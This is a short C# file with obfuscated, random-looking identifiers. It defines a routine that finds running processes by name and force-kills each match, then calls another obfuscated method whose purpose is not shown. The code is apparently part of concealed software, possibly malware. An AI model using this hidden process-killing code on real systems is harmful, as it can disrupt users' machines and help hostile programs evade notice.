using System;
using System.ComponentModel;
using System.Diagnostics;

namespace oEqFtKwIikP;

public class IhasHdPpKK
{
	public static bool OmEqNmdcBJLikOx(Process JlnZisLNMhA, string oZZhNDlqPSEc)
	{
		try
		{
			return JlnZisLNMhA.ProcessName.ToLower().Contains(oZZhNDlqPSEc.ToLower());
		}
		catch (Win32Exception)
		{
			return false;
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void zOtfSRoJoarRKGlQ(string QTLpXAktKco, string PlPcOwmakINRttx)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (OmEqNmdcBJLikOx(process, QTLpXAktKco.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					ieyWohRMXsyos.rGaFcSoQCZvEsGF();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
